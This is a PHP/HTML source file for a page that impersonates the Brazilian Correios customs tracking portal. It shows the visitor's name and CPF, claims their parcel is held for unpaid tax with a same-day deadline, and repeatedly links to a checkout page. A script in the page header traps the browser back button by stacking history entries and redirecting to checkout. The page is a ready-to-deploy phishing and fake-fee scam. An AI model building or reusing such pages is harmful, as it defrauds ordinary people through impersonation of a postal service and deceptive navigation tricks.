<?php
require_once __DIR__ . '/includes/helpers.php';
session_start();
$config = app_config();

$cpf = normalize_cpf((string) ($_GET['cpf'] ?? ($_SESSION['customer']['cpf'] ?? '')));
$nome = sanitize_name((string) ($_GET['nome'] ?? ($_SESSION['customer']['nome'] ?? ($_SESSION['customer']['name'] ?? 'Cliente'))));

if ($cpf && $nome) {
    save_customer_to_session(['cpf' => $cpf, 'nome' => $nome, 'name' => $nome]);
}

$cpfFormatado = $cpf ? format_cpf($cpf) : '000.000.000-00';
$nomeExibicao = $nome !== '' ? $nome : 'Cliente';
$primeiroNome = explode(' ', $nomeExibicao)[0];
$cidade = $config['city'];
$estado = $config['state'];
$prazoRegularizacao = format_date_br('today');
$prazoEntrega = format_date_br('+6 days');
$tracking = $_SESSION['tracking'] ?? [];
$checkoutSuffix = build_query($tracking);
?>
<html lang="pt-BR">

<head>
        <script>
        const checkoutParams = new URLSearchParams();
        const currentParams = new URLSearchParams(window.location.search);
        
        currentParams.forEach((value, key) => {
            if (key.startsWith('utm_') || ['src', 'campaign', 'fbclid', 'gclid', 'click_id'].includes(key)) {
                checkoutParams.set(key, value);
            }
        });

        const queryString = checkoutParams.toString();
        const link = queryString ? 'checkout.php?' + queryString : 'checkout.php';
    
        function setBackRedirect(url) {
            let urlBackRedirect = url;
            const backQuery = checkoutParams.toString();
            if (!backQuery) {
                return;
            }
            urlBackRedirect = urlBackRedirect =
            urlBackRedirect.trim() +
            (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
            backQuery;
    
            history.pushState({}, '', location.href);
            history.pushState({}, '', location.href);
            history.pushState({}, '', location.href);
    
            window.addEventListener('popstate', () => {
            setTimeout(() => {
                location.href = urlBackRedirect;
            }, 1);
            });
        }
    
        setBackRedirect(link);
        </script>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <title>RASTREANDO</title>
    <meta
        content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, shrink-to-fit=no"
        name="viewport" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="" name="description" />
    <meta content="" name="keywords" />
    <meta content="all" name="robots" />
    <meta content="pt_BR" property="og:locale" />
    <meta content="article" property="og:type" />
    <meta content="" property="og:title" />
    <meta content="" property="og:description" />
    <meta content="" property="og:site_name" />
    <link href="./assets/style.css" rel="stylesheet" />
    <link crossorigin="" href="https://pages.greatpages.com.br/" rel="dns-prefetch preconnect" />
    <link crossorigin="" href="https://fonts.googleapis.com/" rel="dns-prefetch preconnect" />
    <link crossorigin="" href="https://fonts.gstatic.com/" rel="dns-prefetch preconnect" />
    <link crossorigin="" href="https://www.greatpages.com.br/" rel="dns-prefetch preconnect" />
    <style id="operaUserStyle" type="text/css"></style>
    <link href="./assets/css2.html" media="all" rel="stylesheet" />
    <style>
        @keyframes clienteButtonPulse {
            0%, 100% {
                transform: scale(1);
                box-shadow: 0 8px 18px rgba(37, 99, 235, 0.10), 0 0 0 3px rgba(147, 197, 253, 0.10);
            }

            50% {
                transform: scale(1.018);
                box-shadow: 0 10px 22px rgba(37, 99, 235, 0.16), 0 0 0 5px rgba(147, 197, 253, 0.16);
            }
        }

        #site button,
        #site .gpc_botao,
        #site a.e_botao {
            animation: clienteButtonPulse 2.8s ease-in-out infinite;
            transform-origin: center;
            will-change: transform, box-shadow;
        }

        #site button:hover,
        #site .gpc_botao:hover,
        #site a.e_botao:hover {
            animation-play-state: paused;
            transform: scale(1.02);
        }

        #site .gpc-e.e_caixa > .c,
        #site .gpc-e.e_imagem > .c,
        #site .imagem_fundo {
            border-radius: 8px !important;
            overflow: hidden;
        }

        #site .gpc-e.e_imagem img {
            border-radius: 8px;
        }

        #e_1225979_1_173671440078955287 .c {
            background-color: #eef2f5 !important;
            border: 1px solid rgba(22, 30, 38, 0.45) !important;
            border-radius: 8px !important;
            box-sizing: border-box;
            box-shadow: none !important;
        }

        #e_1225979_1_65553 .c {
            background: transparent !important;
            border: 0 !important;
            padding: 0 !important;
        }

        #e_1225979_1_65553 .c p {
            margin: 0 0 10px;
        }

        #e_1225979_1_65553 .c p:last-child {
            margin-bottom: 0;
        }

        @media (max-width: 800px) {
            #e_1225979_1_173671440078955287 {
                height: 175px !important;
                left: 14px !important;
                top: 166px !important;
                width: 330px !important;
            }

            #e_1225979_1_65553 {
                left: 30px !important;
                top: 184px !important;
                width: 300px !important;
            }
        }

        @media (prefers-reduced-motion: reduce) {
            #site button,
            #site .gpc_botao,
            #site a.e_botao {
                animation: none !important;
            }
        }

        .identity-sync {
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.18s ease;
        }

        .identity-sync.identity-sync-ready {
            opacity: 1;
            visibility: visible;
        }
    </style>
    <noscript>
        <style>
            .identity-sync {
                opacity: 1 !important;
                visibility: visible !important;
            }
        </style>
    </noscript>
</head>

<body class="">
        <div id="site" style="white-space: normal;">
        <div class="gpc-b" id="b_1225979_1_1736606248678282284c60c" style="white-space: normal;">
            <div class="gpc-b_sobreposicao"></div>
        </div>
        <div class="gpc-b" id="b_1225979_1_1736606248678282284c5df" style="white-space: normal;">
            <div class="gpc-b_sobreposicao"></div>
            <div class="centralizar">
                <div class="gpc-e e_imagem dm e_1225979_1_57686 identity-sync" id="e_1225979_1_57686_m">
                    <div class="c imagem e_imagem">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div class="gpc-e e_texto dm dm e_1225979_1_60477 identity-sync" id="e_1225979_1_60477_m"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><?php echo htmlspecialchars($nomeExibicao, ENT_QUOTES, 'UTF-8'); ?></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dm dm e_1225979_1_51231" id="e_1225979_1_51231_m"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <br />
                        <br />
                        <p style="white-space: normal;"><span><b>ENCOMENDA TRIBUTADA</b></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dm dm e_1225979_1_75116" id="e_1225979_1_75116_m"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><?php echo htmlspecialchars($cpfFormatado, ENT_QUOTES, 'UTF-8'); ?></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dm dm e_1225979_1_83162" id="e_1225979_1_83162_m"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><b><?php echo htmlspecialchars($primeiroNome, ENT_QUOTES, 'UTF-8'); ?> Sua encomenda foi TRIBUTADA</b></p>
                        <p><b><br /></b></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dm dm e_1225979_1_24573" id="e_1225979_1_24573_m"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Status da entrega: <b>Aguardando Pagamento</b></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dm dm e_1225979_1_10156" id="e_1225979_1_10156_m"
                    style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>Sua encomenda está retida na agência dos correios em <?php echo htmlspecialchars($cidade, ENT_QUOTES, 'UTF-8'); ?> - <?php echo htmlspecialchars($estado, ENT_QUOTES, 'UTF-8'); ?></b></span></p>
                    </div>
                </div>
                <div class="gpc-e e_imagem dm e_1225979_1_16907" id="e_1225979_1_16907_m" style="white-space: normal;">
                    <div class="c imagem e_imagem" style="white-space: normal;">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div class="gpc-e e_titulo dm dm e_1225979_1_23145" id="e_1225979_1_23145_m"
                    style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h1><span>Receber até dia <b><?php echo $prazoEntrega; ?></b><b> </b>após o pagamento</span></h1>
                    </div>
                </div>
                <div class="gpc-e e_titulo dm dm e_1225979_1_34836" id="e_1225979_1_34836_m">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h2><b><a
                                    href="checkout.php<?php echo htmlspecialchars($checkoutSuffix, ENT_QUOTES, 'UTF-8'); ?>">Efetuar
                                    Pagamento</a></b></h2>
                    </div>
                </div>
                <div class="gpc-e e_texto dd dm e_1225979_1_65553" id="e_1225979_1_65553" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Nome Completo:</span></p>
                        <p><span><b>
                                    <?php echo htmlspecialchars($nomeExibicao, ENT_QUOTES, 'UTF-8'); ?><br /><br />
                                </b>CPF:<b>
                                    <?php echo htmlspecialchars($cpfFormatado, ENT_QUOTES, 'UTF-8'); ?><br /><br />
                                </b>Prazo
                                para regularização:<b>
                                    <?php echo $prazoRegularizacao; ?></b></span></p>
                    </div>
                </div>
                <br /><br />
                <div class="gpc-e e_botao dd dm e_1225979_1_28606" id="e_1225979_1_28606" style="white-space: normal;">
                    <br />
                    <a class="c borda_igual e_botao link_externo"
                        href="checkout.php<?php echo htmlspecialchars($checkoutSuffix, ENT_QUOTES, 'UTF-8'); ?>"
                        id="695630e3-6473-1ac3-8204-ddee1fec1ad1" style="white-space: normal;">CLIQUE AQUI PARA LIBERAR
                        SEU PEDIDO</a>
                </div>
                <div class="gpc-e e_imagem dd dm e_1225979_1_53338" id="e_1225979_1_53338" style="white-space: normal;">
                    <div cla="" ss="c imagem e_imagem" style="white-space: normal;">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div class="gpc-e e_caixa dd dm e_1225979_1_173671440078955287" id="e_1225979_1_173671440078955287"
                    style="white-space: normal;">
                    <div class="c borda_igual e_caixa"></div>
                </div>
                <div class="gpc-e e_titulo dd dm e_1225979_1_72799" id="e_1225979_1_72799" style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h2><span>Portal Correios </span><span>&gt; </span><span>Rastreamento </span><span>&gt;
                            </span><span>Alfândega</span></h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="gpc-b" id="b_1225979_1_1736606248678282284c603">
            <div class="gpc-b_sobreposicao"></div>
            <div class="centralizar">
                <div class="gpc-e e_imagem dd e_1225979_1_57686 se_imagem identity-sync" id="e_1225979_1_57686_d"
                    ll_src="./images/a379a000-c9e2-4dd8-b8f9-3a857375904c.jpg"
                    ll_src_mobile="./images/a379a000-c9e2-4dd8-b8f9-3a857375904c.jpg">
                    <div class="c imagem e_imagem"></div>
                </div>
                <div class="gpc-e e_texto dd e_1225979_1_60477 identity-sync" id="e_1225979_1_60477_d">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><?php echo htmlspecialchars($nomeExibicao, ENT_QUOTES, 'UTF-8'); ?></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dd e_1225979_1_51231" id="e_1225979_1_51231_d" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>ENCOMENDA TRIBUTADA</b></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dd e_1225979_1_75116" id="e_1225979_1_75116_d">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><?php echo htmlspecialchars($cpfFormatado, ENT_QUOTES, 'UTF-8'); ?></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dd e_1225979_1_83162" id="e_1225979_1_83162_d" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><b><?php echo htmlspecialchars($primeiroNome, ENT_QUOTES, 'UTF-8'); ?> Sua encomenda foi TRIBUTADA</b></p>
                        <p><b><br /></b></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dd e_1225979_1_24573" id="e_1225979_1_24573_d" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Status da entrega: <b>Aguardando Pagamento</b></span></p>
                    </div>
                </div>
                <div class="gpc-e e_texto dd e_1225979_1_10156" id="e_1225979_1_10156_d" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>Sua encomenda está retida na agência dos correios em <?php echo htmlspecialchars($cidade, ENT_QUOTES, 'UTF-8'); ?> - <?php echo htmlspecialchars($estado, ENT_QUOTES, 'UTF-8'); ?></b></span></p>
                    </div>
                </div>
                <div class="gpc-e e_imagem dd e_1225979_1_16907 se_imagem" id="e_1225979_1_16907_d"
                    ll_src="https://cdn.greatsoftwares.com.br/arquivos/paginas_editor/15850-3aeaa092368e52344c66b50a36527aa0.png"
                    ll_src_mobile="https://cdn.greatsoftwares.com.br/arquivos/paginas_editor/15850-3aeaa092368e52344c66b50a36527aa0.png">
                    <div class="c imagem e_imagem"></div>
                </div>
                <div class="gpc-e e_titulo dd e_1225979_1_23145" id="e_1225979_1_23145_d" style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h1><span>Receber até dia <b><?php echo $prazoEntrega; ?></b><b> </b>após o pagamento</span></h1>
                    </div>
                </div>
                <div class="gpc-e e_titulo dd e_1225979_1_34836" id="e_1225979_1_34836_d" style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h2><b><a class="link_externo"
                                    href="checkout.php<?php echo htmlspecialchars($checkoutSuffix, ENT_QUOTES, 'UTF-8'); ?>"
                                    id="33ba3c37-86af-eb59-2201-9cde01fc9125">Efetuar
                                    Pagamento</a></b></h2>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <style>
        .stuck {
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 999999;
        }
    </style>
    <script>
        (function () {
            const identityImageSrc = 'images/a379a000-c9e2-4dd8-b8f9-3a857375904c.jpg';
            const pairs = [
                ['e_1225979_1_57686_m', 'e_1225979_1_60477_m'],
                ['e_1225979_1_57686_d', 'e_1225979_1_60477_d']
            ];

            const reveal = (imageEl, textEl) => {
                imageEl.classList.add('identity-sync-ready');
                textEl.classList.add('identity-sync-ready');
            };

            const preloadImage = (src) => new Promise((resolve) => {
                const img = new Image();
                let resolved = false;
                const finish = () => {
                    if (resolved) {
                        return;
                    }
                    resolved = true;
                    resolve();
                };

                img.onload = finish;
                img.onerror = finish;
                img.src = src;
                if (img.complete) {
                    finish();
                }
                setTimeout(finish, 3000);
            });

            const syncIdentityBlocks = () => {
                preloadImage(identityImageSrc).then(() => {
                    pairs.forEach(([imageId, textId]) => {
                        const imageEl = document.getElementById(imageId);
                        const textEl = document.getElementById(textId);
                        if (!imageEl || !textEl) {
                            return;
                        }

                        requestAnimationFrame(() => reveal(imageEl, textEl));
                    });
                });
            };

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', syncIdentityBlocks, { once: true });
            } else {
                syncIdentityBlocks();
            }
        })();
    </script>
    
</body>

</html>
